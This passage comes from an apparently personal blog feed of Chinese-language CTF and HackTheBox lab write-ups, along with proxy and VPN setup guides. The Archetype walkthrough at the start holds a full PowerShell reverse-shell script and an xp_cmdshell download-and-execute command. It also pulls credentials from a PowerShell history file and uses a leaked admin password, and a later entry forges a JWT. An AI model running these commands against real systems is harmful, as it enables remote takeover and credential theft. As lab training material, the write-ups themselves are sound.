+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.xx.xx.x&quot;</span>,xxx);<span class="variable">$stream</span> =<span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">065535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> =<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> |<span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> =([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
+
+<p>查一下本地ip地址</p>
+<p><code>ifconfig tun0</code></p>
+<p>得知本机在局域网内的ip为10.10.16.10</p>
+<p>修改shell.ps1脚本内ip内容为10.10.16.10，端口为443</p>
+<p>然后在shell.ps1脚本存在的文件夹下运行http服务，因为80端口有服务运行，选择在81端口上运行</p>
+<p><code>python3 -m http.server 81</code></p>
+<p>然后去另一个窗口运行nc，等待10.10.10.27的连接</p>
+<p><code>nc -nlvp 443</code></p>
+<p>接下来进sql窗口执行下列命令</p>
+<p><code>xp_cmdshell &quot;Powershell &quot; IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.10:81/shell.ps1\&quot;);&quot;</code></p>
+<p>在http和nc窗口同时得到反馈</p>
+<p><img src="/images/image-20210413221428797.png"></p>
+<p>在<code>\user\sql_svc\desktop</code>下获取user.txt</p>
+<img src="/images/image-20210413214419239.png" style="zoom:67%;" />
+
+<p>得到user flag <code>3e7b102e78218e935bf3f4951fec21a3</code></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>前面得到的只是普通用户的账号，接下来可以通过type指令查看Powershell的历史记录文件</p>
+<p><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
+<p><img src="/images/image-20210413215004497.png"></p>
+<p>这表示backups对管理员账号进行了映射，我们可以用psexec.py来取得管理员权限</p>
+<p>接下来用管理员账号<code>administrator</code>和密码<code>MEGACORP_4dm1n!!</code>进行登入</p>
+<p><img src="/images/image-20210413221145501.png"></p>
+<p>进入到管理员桌面，取得root.txt</p>
+<img src="/images/image-20210413215944832.png" style="zoom:50%;" />
+
+<p>提交flag<code>b91ccec3305e98240082d4474b848528</code>，完成Archetype机器</p>
+]]></content>
+      <categories>
+        <category>HTB</category>
+        <category>Hacker</category>
+        <category>Security</category>
+        <category>Penetration testing</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>HTB</tag>
+        <tag>Penetration testing</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB通过V2Ray代理访问靶机网页</title>
+    <url>/2021/04/15/HTB%E9%80%9A%E8%BF%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE%E9%9D%B6%E6%9C%BA%E7%BD%91%E9%A1%B5/</url>
+    <content><![CDATA[<h2 id="HTB通过服务器代理访问靶机网页"><a href="#HTB通过服务器代理访问靶机网页" class="headerlink" title="HTB通过服务器代理访问靶机网页"></a>HTB通过服务器代理访问靶机网页</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在之前搭建openvpn访问HTB的文章中，我用的是ubuntu服务器，且没有桌面系统。这篇文章的出现是在攻击靶机的过程中需要访问靶场的网页，因为没有桌面系统，我打算将网页转发到本机上来做。</p>
+<p>一开始考虑的是图形转发，X11的Xmanager尝试了一下，占用带宽太大，输入一个ip需要半分钟的反应时间，因此放弃。</p>
+<p>然后尝试了vnc的图形转发，不同于Xmanager通过端口转发UI界面，vnc是远程连入操作系统，相当于单独开了一个连接窗口。</p>
+<p>但是vnc的安装还需要gnome之类的桌面系统，这和我一开始使用服务器的想法背道而驰。安装期间还搞崩了我的服务器，差点直接提交工单重置。因此安装尝试完之后也放弃了这种方法。</p>
+<p>之后考虑的是流量转发，利用v2ray直接转发本机流量，交给服务器代理访问，这种方式也证明用很好的效果。</p>
+<p>下面记录了·一下我的操作过程。</p>
+<h3 id="V2ray搭建"><a href="#V2ray搭建" class="headerlink" title="V2ray搭建"></a>V2ray搭建</h3><h4 id="时间校准"><a href="#时间校准" class="headerlink" title="时间校准"></a>时间校准</h4><p><code>date -R</code></p>
+<p>查看服务器时间，确保与主机时间误差不超过90s，不同时区的服务器时间确保经过转换之后不超过90s</p>
+<p>如果时间不准确，用</p>
+<p><code>date --set=&quot;XXXX-XX-XX XX:XX:XX&quot;</code></p>
+<p>来设置时间</p>
+<h4 id="服务器安装"><a href="#服务器安装" class="headerlink" title="服务器安装"></a>服务器安装</h4><p>下载安装脚本</p>
+<p><code>wget https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh</code></p>
+<p>安装v2ray</p>
+<p><code>bash install-release.sh</code></p>
+<p>启动v2ray</p>
+<p><code>systemctl start v2ray</code></p>
+<p>设置开机启动</p>
+<p><code>systemctl enable v2ray</code></p>
+<p>查看v2ray状态</p>
+<p><code>systemctl status v2ray</code></p>
+<p>如果显示确实在运行，状态没问题，就可以停下v2ray进行config的配置</p>
+<p>停止v2ray</p>
+<p><code>systemctl stop v2ray</code></p>
+<h4 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a>客户端安装</h4><p>windows在<a href="https://github.com/v2fly/v2ray-core/releases%E4%B8%8B%E8%BD%BD%E6%96%B0%E7%89%88%E7%9A%84v2ray-windows-64.zip%E5%AE%89%E8%A3%85%E5%8C%85%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%8D%B3%E5%8F%AF">https://github.com/v2fly/v2ray-core/releases下载新版的v2ray-windows-64.zip安装包，解压即可</a></p>
+<p>然后设置一下浏览器代理</p>
+<p>本机是chrome浏览器，推荐使用Proxy SwitchyOmega这个插件，能更加方便的切换代理设置</p>
+<p><img src="/images/image-20210415090617478.png"></p>
+<p>点击选项，然后点击左侧新建情景模式</p>
+<img src="/images/image-20210415090742885.png" style="zoom:50%;" />
+
+<p>创建完之后，填写如下</p>
+<p><img src="/images/image-20210415091207398.png"></p>
+<p>然后点击左侧应用选项进行保存</p>
+<h4 id="VMess服务端配置"><a href="#VMess服务端配置" class="headerlink" title="VMess服务端配置"></a>VMess服务端配置</h4><p>生成自己的uuid</p>
+<p><code>cat /proc/sys/kernel/random/uuid &gt; 1.txt</code></p>
+<p>编辑config.json</p>
+<p><code>vim /usr/local/etc/v2ray/config.json</code></p>
+<p>删除注释内容</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;inbounds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yourport&quot;</span><span class="punctuation">,</span> <span class="comment">// 服务器监听端口,自选,删除引号</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vmess&quot;</span><span class="punctuation">,</span>    <span class="comment">// 主传入协议</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;clients&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XXXXXXX-XXXX-XXXX-XXXXX-XXXXXXXX&quot;</span><span class="punctuation">,</span>  <span class="comment">// 用户 ID，客户端与服务器必须相同，复制之前生成的uuid</span></span><br><span class="line">            <span class="attr">&quot;alterId&quot;</span><span class="punctuation">:</span> <span class="number">64</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;outbounds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;freedom&quot;</span><span class="punctuation">,</span>  <span class="comment">// 主传出协议</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="VMess客户端配置"><a href="#VMess客户端配置" class="headerlink" title="VMess客户端配置"></a>VMess客户端配置</h4><p>修改安装包解压之后的config.json，记得删除注释</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;inbounds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">1080</span><span class="punctuation">,</span> <span class="comment">// 监听端口</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;socks&quot;</span><span class="punctuation">,</span> <span class="comment">// 入口协议为 SOCKS 5</span></span><br><span class="line">      <span class="attr">&quot;sniffing&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;destOverride&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;http&quot;</span><span class="punctuation">,</span> <span class="string">&quot;tls&quot;</span><span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;auth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;noauth&quot;</span>  <span class="comment">//socks的认证设置，noauth 代表不认证，由于 socks 通常在客户端使用，所以这里不认证</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;outbounds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vmess&quot;</span><span class="punctuation">,</span> <span class="comment">// 出口协议</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;vnext&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;your_server_ip&quot;</span><span class="punctuation">,</span> <span class="comment">// 服务器地址，请修改为你自己的服务器 IP 或域名</span></span><br><span class="line">            <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="string">&quot;your port&quot;</span><span class="punctuation">,</span>  <span class="comment">// 服务器端口，删除引号</span></span><br><span class="line">            <span class="attr">&quot;users&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XXXXXXX-XXXX-XXXX-XXXXX-XXXXXXXX&quot;</span><span class="punctuation">,</span>  <span class="comment">// 用户 ID，客户端与服务器必须相同，复制之前生成的uuid</span></span><br><span class="line">                <span class="attr">&quot;alterId&quot;</span><span class="punctuation">:</span> <span class="number">64</span> <span class="comment">// 此处的值也应当与服务器相同</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>数据包流程是</p>
+<p><code>&#123;浏览器&#125; &lt;--(socks)--&gt; &#123;V2Ray 客户端 inbound &lt;-&gt; V2Ray 客户端 outbound&#125; &lt;--(VMess)--&gt;  &#123;V2Ray 服务器 inbound &lt;-&gt; V2Ray 服务器 outbound&#125; &lt;--(Freedom)--&gt; &#123;目标网站&#125;</code></p>
+<p>检查服务器config</p>
+<p><code>/usr/local/bin/v2ray -test -config /usr/local/etc/v2ray/config.json</code></p>
+<p>服务器开启v2ray</p>
+<p><code>systemctl start v2ray</code></p>
+<p>客户端打开v2ray.exe</p>
+<p>浏览器切换代理模式</p>
+<p>即可访问HTB靶机网页（记得服务器要开放安全组端口）</p>
+]]></content>
+      <categories>
+        <category>HTB</category>
+        <category>Hacker</category>
+        <category>Security</category>
+        <category>Penetration testing</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>HTB</tag>
+        <tag>Penetration testing</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB VPN配置</title>
+    <url>/2021/03/13/HTB-VPN%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h3 id="HTB-VPN配置"><a href="#HTB-VPN配置" class="headerlink" title="HTB VPN配置"></a>HTB VPN配置</h3><p>服务器： 阿里云 ubuntu</p>
+<p>在服务器安装openvpn</p>
+<p><code>apt-get update</code></p>
+<p><code>apt-get install openvpn</code></p>
+<p>在HTB的Labs页面中找到连接Starting Point</p>
+<p><img src="/images/20210313190126.png"></p>
+<p>选择好其中一个节点进行下载.ovpn文件</p>
+<img src="/images/20210313185138.png" style="zoom:50%;" />
+
+<p>在服务器用openvpn连接到staring point</p>
+<p><code>openvpn starting_point_XXXXX.ovpn</code></p>
+<p>点击Archetype机器，选择Jion Machine，加入之后会告诉你该机器的IP地址</p>
+<img src="/images/20210313185915.png" style="zoom: 50%;" />
+
+<p>在服务器ping该地址，可以ping通</p>
+<img src="/images/20210313190251.png" style="zoom:50%;" />
+
+<p>测试VPN已经搭建完成</p>
+]]></content>
+      <categories>
+        <category>HTB</category>
+        <category>Hacker</category>
+        <category>Security</category>
+        <category>Penetration testing</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>HTB</tag>
+        <tag>Penetration testing</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HacktheBox注册挑战</title>
+    <url>/2021/03/13/HacktheBox%E6%B3%A8%E5%86%8C%E6%8C%91%E6%88%98/</url>
+    <content><![CDATA[<h3 id="HacktheBox注册挑战"><a href="#HacktheBox注册挑战" class="headerlink" title="HacktheBox注册挑战"></a>HacktheBox注册挑战</h3><p>HacktheBox是一个在线靶场，近期准备考OSCP，准备拿靶场练练手。</p>
+<p>HacktheBox的注册有一定的门槛，在这里记录一下解决过程。</p>
+<p><img src="/%5Cimages%5C20210313162402.png" alt="注册页面1"></p>
+<p>点击HACK YOUR WAY IN</p>
+<p><img src="/%5Cimages%5C20210313162502.png" alt="注册页面2"></p>
+<p>在注册页面首先需要输入code，我们先看hint，点击Click Here</p>
+<p><img src="/%5Cimages%5C20210313162644.png" alt="注册码线索"></p>
+<p>提示我们需要检测console</p>
+<p>打开控制台，看到这样的信息</p>
+<img src="\images\20210313162823.png" alt="console信息" style="zoom: 67%;" />
+
+<p>提示我们需要找一个有趣的js文件，进入sources下的page查看调用的js文件，找到一个带有注释的js，提示我们这个js可能被混淆了</p>
+<img src="\images\20210313163055.png" alt="js文件" style="zoom:67%;" />
+
+<p>这个js的内容为eval类型的混淆，经过代码格式化后，eval中function的内容如下</p>
+<img src="\images\20210313163251.png" alt="js中function代码" style="zoom:50%;" />
+
+<p>包含6个参数，并且给了参数的内容</p>
+<p>这边给出两种解混淆的方案</p>
+<ul>
+<li>直接查找反混淆网站，因为是eval类型，反混淆比较容易<ul>
+<li>eval类型的js反混淆网站：<a href="https://www.bm8.com.cn/jsConfusion/">https://www.bm8.com.cn/jsConfusion/</a></li>
+</ul>
+</li>
+<li>vs运行一遍，在最后return p的地方下一个断点，直接查看p的内容<ul>
+<li><img src="/%5Cimages%5C20210313171250.png" alt="vs调试"></li>
+</ul>
+</li>
+</ul>
+<p>最后得到eval的执行内容</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeInviteCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/api/invite/how/to/generate&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据执行内容要求我们用POST访问&#x2F;api&#x2F;invite&#x2F;how&#x2F;to&#x2F;generate</p>
+<p>用hackbar执行（或者postman）</p>
+<img src="\images\20210313164219.png" alt="how-to-generate" style="zoom: 67%;" />
+
+<p>得到如图json内容，该内容可能会改变为ROT13解密方式，但结果应该是一致的</p>
+<p>复制data内容，用hackbar解base64内容</p>
+<img src="\images\20210313164520.png" alt="hackbar解base64" style="zoom:67%;" />
+
+<p>提示我们需要再用post访问&#x2F;api&#x2F;invite&#x2F;generate</p>
+<p>访问获取json内容为</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313164702.png" alt="注册码code1"></p>
+<p>很容易看出这是base64，重复上述操作，用hackbar解密base64内容得到注册码（该注册码是动态变化的）</p>
+<p><code>JBIXF-QDULC-CEBFM-OTBAW-DKHYP</code></p>
+<p>填入之后就可以注册了</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Hacker</category>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux服务器利用V2ray访问外网（命令行）</title>
+    <url>/2021/12/10/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%A9%E7%94%A8V2ray%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%EF%BC%88%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="Linux服务器利用V2ray访问外网（命令行）"><a href="#Linux服务器利用V2ray访问外网（命令行）" class="headerlink" title="Linux服务器利用V2ray访问外网（命令行）"></a>Linux服务器利用V2ray访问外网（命令行）</h2><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>在用go-cqhttp+flask框架实现自定义QQ机器人功能时，想要利用爬虫获取TG机器人的相关发布内容，面临的首个问题就是服务器需要访问外网。</p>
+<p>我手上有很多外网的代理链接，但是很可惜的是这些并不是我自己的VPS服务器；且在我本身linux服务器不带用图形界面，因此无法使用ssr和v2rayN等简洁的代理服务。</p>
+<p>因此，如何在只有命令行的条件下将已有的代理链接变成v2ray客户端配置并访问外网即是本文的主要内容。</p>
+<h3 id="0x01-实现过程"><a href="#0x01-实现过程" class="headerlink" title="0x01 实现过程"></a>0x01 实现过程</h3><p>选择一个已有的代理，获取V2ray的订阅链接。</p>
+<p>这个链接是一个订阅的url，直接在浏览器输入后，即可下载订阅链接的txt文件。</p>
+<p>打开之后是一个base64编码的内容，直接解码。</p>
+<p><img src="/images/image-20211205225346933.png" alt="image-20211205225346933"></p>
+<p>可以看到有vmess:&#x2F;&#x2F;开头的base64内容，如果选择继续解码，你会得到一个json字段，如图。</p>
+<p><img src="/images/image-20211205225721126.png" alt="image-20211205225721126"></p>
+<p>用这些字段确实可以根据v2ray客户端配置的格式补充得到配置文件，但是过于麻烦。</p>
+<p>我们直接将vmess:&#x2F;&#x2F;的内容复制到windows上的v2rayN里面，然后选择“导出所选服务器为服务端配置”。</p>
+<p><img src="/images/image-20211205230049835.png" alt="image-20211205230049835"></p>
+<p>然后将这个配置文件上传到我们的linux服务器上即可，启动时带上-config参数导入配置文件。（linux的V2ray相关配置可以看之前的文章）</p>
+<p><code>v2ray -config /usr/local/etc/v2ray/v2ray.json </code></p>
+<p><img src="/images/image-20211205230342197.png" alt="image-20211205230342197"></p>
+<p>可以看到V2ray已经正常启动。</p>
+<p>接下来需要在另一个命令行窗口中将流量转发到1080端口即可实现代理，输入命令行。</p>
+<p><code>export http_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
+<p><code>export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></p>
+<blockquote>
+<p>注意：该代理只作用在当前终端窗口，不会影响服务器环境</p>
+</blockquote>
+<h3 id="0x02-效果"><a href="#0x02-效果" class="headerlink" title="0x02 效果"></a>0x02 效果</h3><p><img src="/images/image-20211205231153326.png" alt="image-20211205231153326"></p>
+<p>命令行代理已经实现，接下来即可开始实现TG爬虫功能了</p>
+]]></content>
+      <categories>
+        <category>Daily</category>
+      </categories>
+      <tags>
+        <tag>Daily life</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NeSE丙队1月月赛训练</title>
+    <url>/2021/01/22/NeSE%E4%B8%99%E9%98%9F1%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-misc1"><a href="#0x00-misc1" class="headerlink" title="0x00 misc1"></a>0x00 misc1</h4><p>签到题</p>
+<p>直接下载png文件，打开是一个二维码，直接扫码得到</p>
+<p>flag{B1ue_Bing0}</p>
+<h4 id="0x01-stego"><a href="#0x01-stego" class="headerlink" title="0x01 stego"></a>0x01 stego</h4><p>下载文件stego.png</p>
+<p>打开是一个放假通知，用binwalk查看内容</p>
+<p><img src="/images/20210125095532.png" alt="image-20210125095532"></p>
+<p>可以得到这个png含有zip文件，根据图种特点，直接修改后缀.zip，有一个文件名为1的文件，直接打开得到</p>
+<p>flag{ez_z1p_st3g0}</p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x02-admin"><a href="#0x02-admin" class="headerlink" title="0x02 admin"></a>0x02 admin</h4><p>跳转进入网页显示不是admin，无法获取flag</p>
+<p>利用burpsuite抓包看到jwt_token，格式为{header}.{payload}.{verify signature}</p>
+<p>前两个用base64解密，得到header&#x3D;{“alg”:”HS256”,”type”:”JWT”}，payload&#x3D;{“user”:”tourist”} <del>大概是这样，忘记了</del></p>
+<p>jwt_token后面跟着key&#x3D;blueNeSE，verify signature的验证的公式为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  key</span><br><span class="line">) </span><br></pre></td></tr></table></figure>
+
+<p>通过jwt网站<a href="https://jwt.io/%E8%AE%A1%E7%AE%97%E9%AA%8C%E8%AF%81key%E7%A1%AE%E5%AE%9E%E4%B8%BAblueNeSE%EF%BC%8C%E6%9B%B4%E6%94%B9payload%E4%B8%BA%7B%22user%22:%22admin%22%7D%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E9%AA%8C%E8%AF%81%E7%9A%84jwt_token">https://jwt.io/计算验证key确实为blueNeSE，更改payload为{&quot;user&quot;:&quot;admin&quot;}，自动生成验证的jwt_token</a></p>
+<p>修改jwt_token重放包，得到flag<del>忘了</del></p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="0x03-jefferson-wheel"><a href="#0x03-jefferson-wheel" class="headerlink" title="0x03 jefferson wheel"></a>0x03 jefferson wheel</h4><p>加密表为</p>
+<p>ZWAXJGDLUBVIQHKEPNTCRMOSFY&gt;<br>KPBRLNACZDTEXMJQOYHGVSFUWI&gt;<br>BDMAIZVNHSJUWFRTEQGYXPLOCK&gt;<br>RPLHDVNGFCUKTEBSXQYIZMJWAO&gt;<br>IHFRLABEUOTSGJVDKZPMNCQWXY&gt;<br>AMKGHBWPNYCJIFZDRUSLOQXVET&gt;<br>GWTHMPYBXIZULVKSRAFDCEONJQ&gt;<br>NOZUTWDCVRJLXKISYFAPMEGHBQ&gt;<br>XPLTDSRFGENYVUBMCQWAOIKZHJ&gt;<br>UDNAJFBOWCGVRSTZQKELMXYIHP&gt;<br>MNCVBXZQWERTPOIUYALSKDJFHG&gt;<br>LVNCMXZPQOWEJURYTASBKIDFHG&gt;<br>JZQAWVXCDERFSBGTYHNUMKILOP&gt;<br>KQDLOEJPCNFXBIWZGRYMTVHSUA&gt;<br>PVLUBFJSXOWAYGNEIDZTMHCRQK&gt;</p>
+<p>根据密钥[5-9-14-13-1-7-2-12-4-10-6-3-11-15-8]，重组加密表，得到新表为</p>
+<p>IHFRLABEUOTSGJVDKZPMNCQWXY&gt;<br>XPLTDSRFGENYVUBMCQWAOIKZHJ&gt;<br>KQDLOEJPCNFXBIWZGRYMTVHSUA&gt;<br>JZQAWVXCDERFSBGTYHNUMKILOP&gt;<br>ZWAXJGDLUBVIQHKEPNTCRMOSFY&gt;<br>GWTHMPYBXIZULVKSRAFDCEONJQ&gt;<br>KPBRLNACZDTEXMJQOYHGVSFUWI&gt;<br>LVNCMXZPQOWEJURYTASBKIDFHG&gt;<br>RPLHDVNGFCUKTEBSXQYIZMJWAO&gt;<br>UDNAJFBOWCGVRSTZQKELMXYIHP&gt;<br>AMKGHBWPNYCJIFZDRUSLOQXVET&gt;<br>BDMAIZVNHSJUWFRTEQGYXPLOCK&gt;<br>MNCVBXZQWERTPOIUYALSKDJFHG&gt;<br>PVLUBFJSXOWAYGNEIDZTMHCRQK&gt;<br>NOZUTWDCVRJLXKISYFAPMEGHBQ&gt;</p>
+<p>根据密文[Q-J-K-B-P-P-X-D-G-G-F-T-V-U-G]，转动新表得到</p>
+<p>QWXYIHFRLABEUOTSGJVDKZPMNC<br>JXPLTDSRFGENYVUBMCQWAOIKZH<br>KQDLOEJPCNFXBIWZGRYMTVHSUA<br>BGTYHNUMKILOPJZQAWVXCDERFS<br>PNTCRMOSFYZWAXJGDLUBVIQHKE<br>PYBXIZULVKSRAFDCEONJQGWTHM<br>XMJQOYHGVSFUWIKPBRLNACZDTE<br>DFHGLVNCMXZPQOWEJURYTASBKI<br>GFCUKTEBSXQYIZMJWAORPLHDVN<br>GVRSTZQKELMXYIHPUDNAJFBOWC<br>FZDRUSLOQXVETAMKGHBWPNYCJI<br>TEQGYXPLOCKBDMAIZVNHSJUWFR<br>VBXZQWERTPOIUYALSKDJFHGMNC<br>UBFJSXOWAYGNEIDZTMHCRQKPVL<br>GHBQNOZUTWDCVRJLXKISYFAPME</p>
+<p>根据语义，最后一列为flag{chasemeincircle}<del>忘了是大写还是小写</del></p>
+<h4 id="0x04-广播"><a href="#0x04-广播" class="headerlink" title="0x04 广播"></a>0x04 广播</h4><p>下载broadcast.zip和hint.txt</p>
+<p>zip压缩文件内容加密，根据hint.txt得知密码为18位，且是简单的编码方式</p>
+<p>猜测关键词为broadcast，共9位，推测为十六进制编码（十进制会产生1位数对3位数，base64则是1位对4&#x2F;3位）</p>
+<p>利用62726f616463617374解压成功，得到{c3 c2 c1 n3 n2 n1}，根据题目也可以看出为RSA广播攻击</p>
+<p>编写对应的代码如下</p>
